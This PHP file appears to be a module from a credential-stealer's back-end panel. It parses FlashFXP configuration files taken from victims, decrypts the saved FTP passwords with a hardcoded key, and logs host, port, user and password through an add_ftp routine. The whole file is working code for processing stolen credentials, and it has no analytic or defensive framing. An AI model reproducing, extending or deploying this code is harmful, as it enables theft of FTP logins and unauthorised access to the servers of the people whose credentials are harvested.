<?php
//ok
	class Module_flashfxp extends Module_
	{
		protected function Decrypt($Pass, $Key = 'yA36zA48dEhfrvghGRg57h5UlDv3')
		{
			if (!strlen($Pass) || !strlen($Key))
				return '';

			$Pass = hex2bin($Pass);
			if ($Pass === false)
				return '';

			$Result = '';
			$old = ord($Pass[0]); $k = 0;
			for ($i = 1; $i < strlen($Pass); $i++)
			{
				$new = ord($Pass[$i]) ^ ord($Key[$k++ % strlen($Key)]);
				if ($old >= $new)
					$new--;
				$Result .= chr($new-$old);
				$old = ord($Pass[$i]);
			}

			return $Result;
		}
		
		public function process_module($Data, $Version)
		{
			switch ($Version)
			{
				case 0:
					$stream = new Stream($Data);
					while(TRUE)
					{
						$Host = $Pass = $User = $Prot = $Host_ = '';
						
						$Type = $stream->getDWORD();
						if($Type === NULL)
							break;
						
						$File = $stream->getBINARY_();
						if($File == NULL)
							break;
						
						$INI_ = parse_ini($File);
						if(!$INI_)
							return;
						
						foreach($INI_  as $Section => $Element)
						{
							$Host = Assign_($Element['IP']);
							$User = Assign_($Element['user']);
							$Pass = Assign_($Element['pass']);
							$Port = Assign_($Element['port']);
							
							if ($Type == 1)
								$Pass = $this->Decrypt($Pass, $Section);
							else
								$Pass = $this->Decrypt($Pass);
							
							$this->add_ftp($this->append_port($Host, $Port), $User, $Pass);
						}
						
						$INI_ = NULL;
					}
					$stream = NULL;
					break;
				default:
					return FALSE;
			}
			
			return TRUE;
		}
	}